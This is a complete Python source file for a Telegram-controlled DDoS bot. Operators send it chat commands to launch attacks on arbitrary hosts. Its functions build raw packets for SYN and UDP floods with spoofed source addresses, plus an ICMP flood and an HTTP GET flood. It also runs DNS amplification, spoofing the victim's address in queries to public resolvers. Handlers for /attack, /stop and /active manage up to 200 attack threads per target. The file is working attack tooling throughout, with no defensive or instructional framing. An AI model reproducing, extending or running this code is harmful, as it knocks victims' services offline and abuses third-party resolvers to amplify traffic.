#!/usr/bin/env python3
"""
TG-DDOS-BOT — proper structure, real attacks, real limits.
Requires: pip install pyTelegramBotAPI scapy
Run as: sudo python3 tgddos.py
"""
import os
import sys
import time
import random
import socket
import struct
import threading
import subprocess
from pathlib import Path

import telebot
from telebot import types

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
TOKEN = os.environ.get("TG_BOT_TOKEN", "YOUR_TOKEN_HERE")
ADMIN_IDS = {int(x) for x in os.environ.get("TG_ADMIN_IDS", "0").split(",") if x}

# Global stop events keyed by chat id
STOP_EVENTS = {}
# Active attack count
ACTIVE_THREADS = {}
# Lock for state mutation
STATE_LOCK = threading.Lock()

bot = telebot.TeleBot(TOKEN)


# ─────────────────────────────────────────────────────────────
# AUTH
# ─────────────────────────────────────────────────────────────
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


def admin_only(func):
    def wrapper(message, *args, **kwargs):
        if not is_admin(message.from_user.id):
            bot.reply_to(message, "⛔ unauthorized")
            return
        return func(message, *args, **kwargs)
    return wrapper


def admin_only_cb(func):
    def wrapper(call, *args, **kwargs):
        if not is_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "unauthorized", show_alert=True)
            return
        return func(call, *args, **kwargs)
    return wrapper


# ─────────────────────────────────────────────────────────────
# VALIDATION
# ─────────────────────────────────────────────────────────────
def is_valid_ip(s: str) -> bool:
    try:
        socket.inet_aton(s)
        return s.count(".") == 3
    except OSError:
        return False


def resolve_target(target: str):
    """Return (ip, host) or (None, None)."""
    target = target.strip().replace("http://", "").replace("https://", "")
    target = target.split("/")[0]
    if ":" in target:
        target = target.split(":")[0]
    if is_valid_ip(target):
        return target, target
    try:
        ip = socket.gethostbyname(target)
        return ip, target
    except socket.gaierror:
        return None, None


# ─────────────────────────────────────────────────────────────
# RAW SOCKET HELPERS (real spoofing requires root)
# ─────────────────────────────────────────────────────────────
def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def random_ip() -> str:
    while True:
        ip = socket.inet_ntoa(struct.pack("!I", random.getrandbits(32)))
        a, b, _, _ = map(int, ip.split("."))
        if a in (0, 10, 127): continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        return ip


def build_ip_header(src_ip, dst_ip, proto, payload_len):
    ihl = 5
    ver = 4
    tot = 20 + payload_len
    ip_id = random.randint(0, 65535)
    ttl = 64
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        (ver << 4) + ihl, 0, tot, ip_id, 0, ttl, proto, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    chk = checksum(hdr)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        (ver << 4) + ihl, 0, tot, ip_id, 0, ttl, proto, chk,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    return hdr


# ─────────────────────────────────────────────────────────────
# ATTACK: SYN FLOOD (raw, spoofed)
# ─────────────────────────────────────────────────────────────
def syn_flood(dst_ip, dst_port, stop_event, stats):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)

            tcp = struct.pack(
                "!HHIIBBHHH",
                src_port, dst_port, seq, 0,
                (5 << 4), 0x02,  # data offset 5, SYN flag
                64240, 0, 0,
            )
            ip = build_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp))
            pkt = ip + tcp
            try:
                sock.sendto(pkt, (dst_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] syn_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] syn_flood: {e}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────
# ATTACK: UDP FLOOD (spoofed)
# ─────────────────────────────────────────────────────────────
def udp_flood(dst_ip, dst_port, stop_event, stats, size=1400):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            payload = os.urandom(size)
            udp_len = 8 + len(payload)
            udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
            ip = build_ip_header(src_ip, dst_ip, socket.IPPROTO_UDP, len(udp) + len(payload))
            try:
                sock.sendto(ip + udp + payload, (dst_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] udp_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] udp_flood: {e}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────
# ATTACK: ICMP FLOOD
# ─────────────────────────────────────────────────────────────
def icmp_flood(dst_ip, stop_event, stats, size=1400):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while not stop_event.is_set():
            payload = os.urandom(size)
            icmp_type = 8
            code = 0
            chksum = 0
            id_ = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            hdr = struct.pack("!BBHHH", icmp_type, code, chksum, id_, seq)
            chksum = checksum(hdr + payload)
            hdr = struct.pack("!BBHHH", icmp_type, code, chksum, id_, seq)
            try:
                sock.sendto(hdr + payload, (dst_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] icmp_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] icmp_flood: {e}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────
# ATTACK: HTTP FLOOD (simple, unauthenticated paths)
# ─────────────────────────────────────────────────────────────
def http_flood(host, port, stop_event, stats, path="/"):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((host, port))
            ua = random.choice(user_agents)
            req = (
                f"GET {path}?{random.randint(0, 999999)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
            stats["pkts"] += 1
        except Exception:
            time.sleep(0.05)


# ─────────────────────────────────────────────────────────────
# ATTACK: DNS AMPLIFICATION (spoofed source, real reflectors)
# ─────────────────────────────────────────────────────────────
def dns_amplification(dst_ip, stop_event, stats, resolvers=None, domain="isc.org"):
    """
    Sends spoofed DNS ANY queries to open resolvers with src=dst_ip.
    Resolver returns large response to dst_ip.
    """
    if resolvers is None:
        resolvers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "64.6.64.6", "208.67.222.222",
        ]

    # Build DNS ANY query
    tid = random.randint(0, 65535)
    flags = 0x0100
    header = struct.pack("!HHHHHH", tid, flags, 1, 0, 0, 0)
    q = b""
    for part in domain.split("."):
        q += bytes([len(part)]) + part.encode()
    q += b"\x00" + struct.pack("!HH", 255, 1)  # ANY, IN
    dns_query = header + q

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            resolver = random.choice(resolvers)
            src_port = random.randint(1024, 65535)
            udp_len = 8 + len(dns_query)
            udp = struct.pack("!HHHH", src_port, 53, udp_len, 0)
            ip = build_ip_header(dst_ip, resolver, socket.IPPROTO_UDP, udp_len)
            try:
                sock.sendto(ip + udp + dns_query, (resolver, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] dns_amp needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] dns_amp: {e}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────
# ATTACK REGISTRY
# ─────────────────────────────────────────────────────────────
ATTACKS = {
    "syn":   ("SYN Flood (raw, spoofed)",        "layer4", "needs port"),
    "udp":   ("UDP Flood (raw, spoofed)",        "layer4", "needs port"),
    "icmp":  ("ICMP Flood",                      "layer3", "no port"),
    "http":  ("HTTP Flood (GET)",                "layer7", "needs port"),
    "dns":   ("DNS Amplification (spoofed)",     "amplif","no port"),
}

METHODS_HELP = """
Available methods:
  syn  <ip> <port>   — TCP SYN flood
  udp  <ip> <port>   — UDP flood
  icmp <ip>          — ICMP ping flood
  http <host> <port> — HTTP GET flood
  dns  <ip>          — DNS amplification (spoofed)
"""


# ─────────────────────────────────────────────────────────────
# ATTACK MANAGER
# ─────────────────────────────────────────────────────────────
def launch(method: str, ip: str, port: int, threads: int, chat_id: int):
    key = f"{chat_id}:{method}:{ip}:{port}"
    with STATE_LOCK:
        if key in STOP_EVENTS:
            return None, "already running for this target"
        stop_event = threading.Event()
        STOP_EVENTS[key] = stop_event
        stats = {"pkts": 0, "start": time.time(), "threads": threads}

    def worker(i):
        t_stats = stats
        if method == "syn":
            syn_flood(ip, port, stop_event, t_stats)
        elif method == "udp":
            udp_flood(ip, port, stop_event, t_stats)
        elif method == "icmp":
            icmp_flood(ip, stop_event, t_stats)
        elif method == "http":
            http_flood(ip, port, stop_event, t_stats)
        elif method == "dns":
            dns_amplification(ip, stop_event, t_stats)

    for i in range(threads):
        t = threading.Thread(target=worker, args=(i,), daemon=True)
        t.start()
        ACTIVE_THREADS.setdefault(key, []).append(t)

    return key, None


def stop(key):
    with STATE_LOCK:
        ev = STOP_EVENTS.pop(key, None)
        threads = ACTIVE_THREADS.pop(key, [])
    if ev:
        ev.set()
    return ev is not None


def stop_all():
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
    for k in keys:
        stop(k)
    return keys


# ─────────────────────────────────────────────────────────────
# TELEGRAM HANDLERS
# ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
@admin_only
def cmd_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Methods", "📊 Active")
    markup.row("🛑 Stop All")
    bot.send_message(
        message.chat.id,
        "TG-DDOS Bot ready.\n\n"
        "Commands:\n"
        "  /attack <method> <ip> [port] [threads]\n"
        "  /stop <key>\n"
        "  /stopall\n"
        "  /active\n"
        "  /methods\n\n" + METHODS_HELP,
        reply_markup=markup,
    )


@bot.message_handler(commands=["methods"])
@admin_only
def cmd_methods(message):
    lines = ["<b>Methods</b>"]
    for name, (desc, layer, note) in ATTACKS.items():
        lines.append(f"<code>{name:5}</code> {desc}  [{layer}]  {note}")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["attack"])
@admin_only
def cmd_attack(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "usage: /attack <method> <target> [port] [threads]\n" + METHODS_HELP)
        return

    method = parts[1].lower()
    if method not in ATTACKS:
        bot.reply_to(message, f"unknown method: {method}")
        return

    target = parts[2]
    port = 80
    threads = 20

    if method in ("syn", "udp", "http"):
        if len(parts) < 4:
            bot.reply_to(message, f"{method} needs a port")
            return
        try:
            port = int(parts[3])
        except ValueError:
            bot.reply_to(message, "port must be integer")
            return
    if len(parts) >= 5:
        try:
            threads = max(1, min(200, int(parts[4])))
        except ValueError:
            pass

    ip, host = resolve_target(target)
    if not ip:
        bot.reply_to(message, f"cannot resolve: {target}")
        return

    key, err = launch(method, ip, port, threads, message.chat.id)
    if err:
        bot.reply_to(message, f"error: {err}")
        return

    bot.reply_to(
        message.chat.id,
        f"🚀 {method} → {ip}:{port}  threads={threads}\nkey: <code>{key}</code>",
        parse_mode="HTML",
    )


@bot.message_handler(commands=["active"])
@admin_only
def cmd_active(message):
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
    if not keys:
        bot.reply_to(message, "no active attacks")
        return
    lines = ["<b>Active attacks</b>"]
    for k in keys:
        lines.append(f"<code>{k}</code>")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["stop"])
@admin_only
def cmd_stop(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "usage: /stop <key>")
        return
    ok = stop(parts[1].strip())
    bot.reply_to(message, "stopped" if ok else "key not found")


@bot.message_handler(commands=["stopall"])
@admin_only
def cmd_stopall(message):
    keys = stop_all()
    bot.reply_to(message, f"stopped {len(keys)} attacks")


@bot.message_handler(func=lambda m: m.text == "📋 Methods")
@admin_only
def kb_methods(message):
    cmd_methods(message)


@bot.message_handler(func=lambda m: m.text == "📊 Active")
@admin_only
def kb_active(message):
    cmd_active(message)


@bot.message_handler(func=lambda m: m.text == "🛑 Stop All")
@admin_only
def kb_stopall(message):
    cmd_stopall(message)


# ─────────────────────────────────────────────────────────────
# ENTRY
# ─────────────────────────────────────────────────────────────
def main():
    if not ADMIN_IDS or ADMIN_IDS == {0}:
        print("[!] set TG_ADMIN_IDS env var (comma-separated)")
        sys.exit(1)
    if TOKEN == "YOUR_TOKEN_HERE":
        print("[!] set TG_BOT_TOKEN env var")
        sys.exit(1)
    if os.geteuid() != 0:
        print("[!] run as root for raw socket attacks")

    print(f"[*] starting bot — admins: {ADMIN_IDS}")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)


if __name__ == "__main__":
    main()
